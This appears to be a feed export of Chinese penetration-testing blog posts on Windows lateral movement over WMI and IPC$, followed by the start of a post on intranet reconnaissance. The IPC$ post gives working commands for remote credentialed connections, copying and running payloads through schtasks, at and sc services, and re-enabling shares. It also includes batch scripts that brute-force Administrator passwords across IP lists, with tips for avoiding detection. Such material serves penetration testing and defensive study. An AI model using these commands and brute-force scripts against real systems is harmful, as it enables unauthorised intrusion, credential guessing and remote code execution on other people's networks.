是为了解决<code>wmic</code>无法回显命令而开发的一个工具，原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显 ”执行命令的结果“ 和获取 ”半交互式的 shell“  。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs &#x2F;cmd 192.168.1.1 administrator test@123 whoami</span><br></pre></td></tr></table></figure><h4 id="impacket-wmiexec"><a href="#impacket-wmiexec" class="headerlink" title="impacket-wmiexec"></a>impacket-wmiexec</h4><p>优点：支持pth</p><p>缺点：他的使用需要调用wmi服务，占用目标的445、135和另一个随机端口，而smbexec只使用445端口。</p><p>使用参考：2.（1）<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/</a> </p><h4 id="sharpwmi"><a href="#sharpwmi" class="headerlink" title="sharpwmi"></a>sharpwmi</h4><p>这是一个基于<code>135</code>端口来进行横向移动的工具，具有执行命令和上传文件功能，通过<code>wmi</code>来执行命令，通过调用来进行数据传输。<br>优点：只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口<br>缺点：目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。执行命令和上传文件都依赖<strong>powershell(被360拦截了)</strong></p><p><a href="https://github.com/QAX-A-Team/sharpwmi">https://github.com/QAX-A-Team/sharpwmi</a></p><h4 id="WMIHACKER-推荐"><a href="#WMIHACKER-推荐" class="headerlink" title="WMIHACKER(推荐)"></a>WMIHACKER(推荐)</h4><p>免杀横向渗透远程命令执行，常见的<code>WMIEXEC</code>、<code>PSEXEC</code>执行命令是创建服务或调用<code>Win32_Process.create</code>执行命令，这些方式都已经被杀软100%拦截，通过改造出<code>WMIHACKER</code>免杀横向移动测试工具。(只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口)</p><p>重要：支持pth -&gt;  <a href="https://github.com/360-Linton-Lab/WMIHACKER/issues/1">https://github.com/360-Linton-Lab/WMIHACKER/issues/1</a> </p><p>主要功能：1、命令执行；2、文件上传；3、文件下载</p><p><a href="https://github.com/360-Linton-Lab/WMIHACKER">https://github.com/360-Linton-Lab/WMIHACKER</a></p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">WMI爆破</td><td align="left">135端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WmiScan.html">http://k8gege.org/Ladon/WmiScan.html</a></td></tr><tr><td align="left">WMI-NtlmHash爆破</td><td align="left">135端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WmiHashScan.html">http://k8gege.org/Ladon/WmiHashScan.html</a></td></tr></tbody></table><h4 id="Sharp-WMIExec"><a href="#Sharp-WMIExec" class="headerlink" title="Sharp-WMIExec"></a>Sharp-WMIExec</h4><p>没有使用过，暂未测试</p><p><a href="https://github.com/checkymander/Sharp-WMIExec">https://github.com/checkymander/Sharp-WMIExec</a> </p><h4 id="WMIcmd"><a href="#WMIcmd" class="headerlink" title="WMIcmd"></a>WMIcmd</h4><p>没有使用过，暂未测试</p><p><a href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于WMI的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于IPC的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-07-12T07:11:24.000Z</published>
    <updated>2020-11-14T19:53:20.982Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于IPC的横向移动</p></blockquote><a id="more"></a><p>文章内容引用较多，尽量不说废话，注明链接的地方，请自行阅读并理解。</p><h2 id="IPC-的概念"><a href="#IPC-的概念" class="headerlink" title="IPC$的概念"></a>IPC$的概念</h2><p><code>IPC$(Internet Process Connection)</code>是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</p><h2 id="IPC-的作用"><a href="#IPC-的作用" class="headerlink" title="IPC$的作用"></a>IPC$的作用</h2><p>利用<code>IPC$</code>，连接者可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。 </p><h2 id="IPC-的利用条件"><a href="#IPC-的利用条件" class="headerlink" title="IPC$的利用条件"></a>IPC$的利用条件</h2><h3 id="139，445端口开启"><a href="#139，445端口开启" class="headerlink" title="139，445端口开启"></a>139，445端口开启</h3><p><code>IPC$</code>连接可以实现远程登陆及对默认共享的访问，而<code>139</code>端口的开启表示<code>netbios</code>协议的应用。我们可以通过<code>139</code>和<code>445</code>端口来实现对共享文件/打印机的访问，因此一般来讲，<code>IPC$</code>连接是需要<code>139</code>或<code>445</code>端口来支持的。</p><p>注：<code> Windows</code>系统中的<code>net use ipc$</code>整个通信过程，先<code>445-&gt;137-&gt;139</code>验证，当你开启防火墙禁用<code>445</code>，发现系统命令就无法连接<code>IPC</code>了，因为根本没机会走到<code>139</code>，所以使用系统自带命令连接的<code>ipc$</code>需要同时开启这些端口 ，参考自<code>K8gege.org</code>。</p><h3 id="管理员开启了默认共享"><a href="#管理员开启了默认共享" class="headerlink" title="管理员开启了默认共享"></a>管理员开启了默认共享</h3><p>默认共享是为了方便管理员远程管理而默认开启的共享，即所有的逻辑盘<code>（C$,D$,E$...）</code>和系统目录<code>WINNT</code>或<code>WINDOWS(ADMIN$)</code>，我们通过<code>IPC</code>连接可以实现对这些默认共享的访问。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;net share</span><br><span class="line"></span><br><span class="line">共享名       资源                            注解</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">C<span class="variable">$</span>           C:\                             默认共享</span><br><span class="line">IPC<span class="variable">$</span>                                         远程 IPC</span><br><span class="line">ADMIN<span class="variable">$</span>       C:\WINDOWS                      远程管理</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="建立远程连接时的用户权限问题"><a href="#建立远程连接时的用户权限问题" class="headerlink" title="建立远程连接时的用户权限问题"></a>建立远程连接时的用户权限问题</h3><p>这个不多说，很多文章没有介绍，是一个坑点：<a href="https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/">传送门-关于IPC和PTH用户权限问题</a></p><p>※即默认情况下只有域管用户有权限对<code>admin$</code>目录建立<code>IPC</code>连接，其实本地的<code>Administrator</code>用户也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用<code>Administrator</code>用户远程连接 </p><h4 id="IPC-连接失败常见错误号："><a href="#IPC-连接失败常见错误号：" class="headerlink" title="IPC$连接失败常见错误号："></a>IPC$连接失败常见错误号：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">错误号 <span class="number">5</span>，拒绝访问【很可能你使用的用户不是管理员权限的，先提升权限】</span><br><span class="line">错误号 <span class="number">51</span>，Windows 无法找到网络路径【网络有问题】</span><br><span class="line">错误号 <span class="number">53</span>，找不到网络路径【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动； 目标有防火墙（端口过滤）】</span><br><span class="line">错误号 <span class="number">67</span>，找不到网络名【你的 lanmanworkstation 服务未启动；目标删除了 ipc<span class="variable">$</span>；】 </span><br><span class="line">错误号 <span class="number">1219</span>，提供的凭据与已存在的凭据集冲突【你已经和对方建立了一个ipc<span class="variable">$</span>，请删除后再连】</span><br><span class="line">错误号 <span class="number">1326</span>，未知的用户名或错误密码【原因很明显了】</span><br><span class="line">错误号 <span class="number">1385</span>，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="line">---</span><br><span class="line">情况<span class="number">1</span>：可能是你在“拒绝从网络访问这台计算机”功能中拒绝了该用户的访问，解决方法如下：</span><br><span class="line">开始--&gt;运行--&gt;gpedit.msc计算机配置--&gt;Windows设置--&gt;安全设置--&gt;本地策略--&gt;用户权利指派--&gt;拒绝从网络访问这台计算机--&gt;删除你要正常连接的用户</span><br><span class="line">情况<span class="number">2</span>：</span><br><span class="line">(<span class="number">1</span>)网络访问为：经典</span><br><span class="line">(<span class="number">2</span>)来宾账户状态：已启用，</span><br><span class="line">(<span class="number">3</span>)拒绝从网络访问这台计算机里有Guest用户或组</span><br><span class="line">(<span class="number">4</span>)你执行net use \\xxx.xxx.xxx.xxx\IPC<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;xxx&quot;</span> 输入的用户名是随便输入的，这时也会遇到这个错误信息，因为当你连接的用户不存在时，net use会默认用Guest用户来进行连接，而Guest用户已拒绝从网络访问，所以也会出现这种错误</span><br><span class="line">---</span><br><span class="line">错误号 <span class="number">1792</span>，试图登录，但是网络登录服务没有启动【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="line">错误号 <span class="number">2242</span>，此用户的密码已经过期【目标有帐号策略，强制定期要求更改密码】 </span><br></pre></td></tr></table></figure><h2 id="基于IPC-的横向移动"><a href="#基于IPC-的横向移动" class="headerlink" title="基于IPC$的横向移动"></a>基于IPC$的横向移动</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>.建立空连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> <span class="string">&quot;&quot;</span> /u:<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">1</span>.建立正常连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> <span class="string">&quot;1qaz@WSX&quot;</span> /user:<span class="string">&quot;Administrator&quot;</span> </span><br><span class="line"><span class="number">2</span>.查看本机连接共享情况</span><br><span class="line">net use</span><br><span class="line"><span class="number">3</span>.查看已建立连接目标主机的共享资源</span><br><span class="line">net view \\<span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">4</span>.查看目标主机时间</span><br><span class="line">net time \\<span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">5</span>.查看目标主机的NetBIOS用户（自己本机也需开启）</span><br><span class="line">nbtstat <span class="literal">-A</span> <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">6</span>.删除本机与指定ip建立的连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> /<span class="built_in">del</span> /y</span><br><span class="line"><span class="number">7</span>.删除本机所有已建立的连接</span><br><span class="line">net use * /<span class="built_in">del</span> /y</span><br><span class="line"><span class="number">8</span>.文件的上传下载与删除</span><br><span class="line"><span class="built_in">copy</span> plugin_update.exe \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\windows\temp\plugin_update.exe</span><br><span class="line">[推荐用<span class="type">xcopy</span>]:</span><br><span class="line">xcopy d:\sqlitedata\*.* \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\temp /E /Y /D</span><br><span class="line">（上传本地文件到目标的:c\windows\temp\目录下）</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\plugin_update.exe c:\</span><br><span class="line">（下载目标文件到本地c盘下）</span><br><span class="line"><span class="built_in">del</span> \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\plugin_update.exe /F</span><br><span class="line">（删除目标文件）</span><br><span class="line"><span class="number">9</span>.创建计划任务之schtasks</span><br><span class="line">schtasks /create /tn <span class="string">&quot;plugin_update&quot;</span> /tr c:\windows\temp\plugin_update.exe /<span class="built_in">sc</span> once /st <span class="number">16</span>:<span class="number">32</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">补充<span class="number">1</span>：schtasks /create /tn <span class="string">&quot;Flash_Update&quot;</span> /tr C:\Users\Public\Flash_Update.exe /<span class="built_in">sc</span> minute /mo <span class="number">1</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">立即执行计划任务</span><br><span class="line">schtasks /run /tn <span class="string">&quot;plugin_update&quot;</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">删除计划任务</span><br><span class="line">schtasks /F /delete /tn <span class="string">&quot;plugin_update&quot;</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">计划任务远程开启默认共享&#123;注意查看目标主机时间&#125;</span><br><span class="line">schtasks /create /tn <span class="string">&quot;plugin_update&quot;</span> /tr <span class="string">&quot;cmd /c net share c<span class="variable">$</span>=c:&quot;</span> /<span class="built_in">sc</span> once /st <span class="number">16</span>:<span class="number">25</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line"><span class="number">10</span>.创建计划任务之at</span><br><span class="line">（at只支持win03和部分老版本win08，一般情况下，win08<span class="literal">-SP1</span>的系统是能添加at计划任务的，但不一定执行，推荐win08及之后的系统都选择schtasks创建计划任务）</span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">14</span>:<span class="number">05</span> cmd /c <span class="string">&quot;c:\windows\temp\test.bat&quot;</span> </span><br><span class="line"><span class="number">11</span>.SC创建服务</span><br><span class="line">（需先IPC连接，添加的常规程序需要有返回值,不然启动服务时会报<span class="number">1053</span>错误）</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> create shellsrv binpath= <span class="string">&quot;c:\shell.exe&quot;</span> <span class="built_in">start</span>= auto displayname= <span class="string">&quot;shellstart&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> create test binpath= <span class="string">&quot;c:\windows\temp\test.bat&quot;</span> <span class="built_in">start</span>= auto displayname= <span class="string">&quot;shellstart&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> <span class="built_in">start</span> shllsrv</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> stop shllsrv</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> delete shellsrv</span><br><span class="line"><span class="number">12</span>.删除默认共享</span><br><span class="line">net share c<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line"><span class="number">13</span>.恢复默认共享</span><br><span class="line">net share c<span class="variable">$</span>=c:</span><br><span class="line"><span class="number">15</span>.对方的c盘映射为自己的z盘，其他盘类推(不推荐)</span><br><span class="line">net use z: \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span> <span class="string">&quot;1qaz@WSX&quot;</span> /user:<span class="string">&quot;administrator&quot;</span></span><br><span class="line"><span class="number">16</span>.删除映射的c盘，其他盘类推</span><br><span class="line">net use c: /<span class="built_in">del</span></span><br></pre></td></tr></table></figure><h3 id="批量爆破"><a href="#批量爆破" class="headerlink" title="批量爆破"></a>批量爆破</h3><p>内网中爆破弱口令时首选的便是使用<code>ipc</code>，爆破错误次数一般也不会做限制，但是一定要注意爆破成功的结果是否为匿名权限的<code>ipc</code>连接。</p><p>弱口令爆破这种手段在在内网中是一把双刃剑，如果公司领导未过于重视网络安全的话，导致信息安全部地位低下、资金有限，那么在缺乏安全设备监控与员工网络安全意识低下的情况下，在内网进行弱口令爆破是一件非常高效地事情，如大部分的央企、国企二级单位。</p><p>但另一方面，如果该公司确实在网络安全方面投入较大人力财力，那么弱口令爆破无异于自杀。</p><p>弱口令字典可由部分简单口令和部分复杂规则口令与企业名称+年份组成，如<code>12345678</code>,<code>000000</code>,<code>1q2w3e4r</code>,<code>1qaz2wsx</code>,<code>baidu@2020</code>,<code>baidu@123</code>等，不宜超过100条且建议单线程慢速爆破，避免被拦截。</p><p>使用说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip.txt 放入要爆破的IP</span><br><span class="line">pass.txt 放入爆破的密码</span><br><span class="line">默认爆破用户：Administrator</span><br><span class="line">爆破成功的结果，会在bat运行的当前目录生成pic.txt</span><br><span class="line">爆破进度的查询：type log.txt，完成后当前目录生成end.txt</span><br></pre></td></tr></table></figure><p><strong>坑点：需注意特殊字符，如密码中有 <code>%</code> 需要用 <code>%</code> 来转义，例 ：<code>123#$%</code> 应转化为 <code>123#$%%</code></strong> </p><p>1.给定多个密码爆破</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt pass.txt</span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="keyword">FOR</span> /F %%p <span class="keyword">in</span> (%<span class="number">2</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;%%p&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span> &gt;&gt; log.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;%%p&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span>  &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> NOT errorlevel <span class="number">1</span> (</span><br><span class="line"><span class="built_in">echo</span> %%p  t:%%i&gt;&gt; pic.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line">)</span><br><span class="line">net use * /<span class="built_in">del</span> /y &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><p>2.固定密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt</span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span> &gt;&gt; log.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span>  &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> NOT errorlevel <span class="number">1</span> (</span><br><span class="line"><span class="built_in">echo</span> success:%%i&gt;&gt; pic.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line">)</span><br><span class="line">net use * /<span class="built_in">del</span> /y &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>温馨小提示：有杀软的内网环境中，尽量用<code>windows</code>自带功能来完成需求，使用工具要慎重，一定要本地做好测试在丢到目标上运行。</p><h4 id="PSEXEC"><a href="#PSEXEC" class="headerlink" title="PSEXEC"></a>PSEXEC</h4><p>不推荐，很容易就被杀软拦截，<a href="https://download.sysinternals.com/files/PSTools.zip">微软官方pstools</a> </p><p>域渗透学习（五）基于IPC的远程连接： <a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</a> </p><h4 id="Impacket套件"><a href="#Impacket套件" class="headerlink" title="Impacket套件"></a>Impacket套件</h4><p>更多的连接方式还有 <code>smbexec</code>、<code>psexec</code>、<code>atexec</code>， 都可在github社区中找到，比较简单的就是在 <code>impacket</code> 工具<br>包找到相关文件，使用方法自行查阅帮助文档，这里不再赘述。</p><p>python版：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>exe版：<a href="https://github.com/ropnop/impacket_static_binaries/releases">https://github.com/ropnop/impacket_static_binaries/releases</a>    v0.9.19稳</p><p>Impacket套件之远程命令执行功能讲解： <a href="https://mp.weixin.qq.com/s/kVTAe2BLya-lwOXzKdvHGA">https://mp.weixin.qq.com/s/kVTAe2BLya-lwOXzKdvHGA</a> </p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">SMB爆破/IPC/共享</td><td align="left">445端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/SmbScan.html">http://k8gege.org/Ladon/SmbScan.html</a></td></tr><tr><td align="left">Netbios爆破</td><td align="left">139端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/NbtScan.html">http://k8gege.org/Ladon/NbtScan.html</a></td></tr><tr><td align="left">SMB-NtlmHash爆破</td><td align="left">445端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/SmbHashScan.html">http://k8gege.org/Ladon/SmbHashScan.html</a></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于IPC的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|内网中的信息收集</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-07-12T07:10:24.000Z</published>
    <updated>2020-11-14T19:53:53.820Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>无论是通过外网打点，还是水坑钓鱼，进入内网后的第一步，也是最重要的一步就是信息收集，而且信息收集往往是一直穿插在整个内网渗透过程中。</p></blockquote><a id="more"></a><h2 id="工作组和域的区分"><a href="#工作组和域的区分" class="headerlink" title="工作组和域的区分"></a>工作组和域的区分</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.ipconfig /all</span><br><span class="line">有Primary Dns Suffix（主 DNS 后缀）就说明是域内，空的则当前机器应该在工作组。</span><br><span class="line"><span class="number">2</span>.net config workstation </span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">软件版本                      Windows <span class="number">10</span> Home China</span><br><span class="line">工作站域                       WORKGROUP</span><br><span class="line">登录域                          MicrosoftAccount</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">工作站域                     HACK7</span><br><span class="line">工作站域 DNS 名称            hack7.local</span><br><span class="line">登录域                       HACK7</span><br><span class="line">------------------------------------------------</span><br><span class="line"><span class="number">3</span>.systeminfo</span><br><span class="line">这里注意字体大小写，工作组一般都是全大写，但是遇到的也有小写的情况，暂时不明白怎么设置的</span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">域:               hack7.local</span><br><span class="line">------------------------------------------------</span><br><span class="line"><span 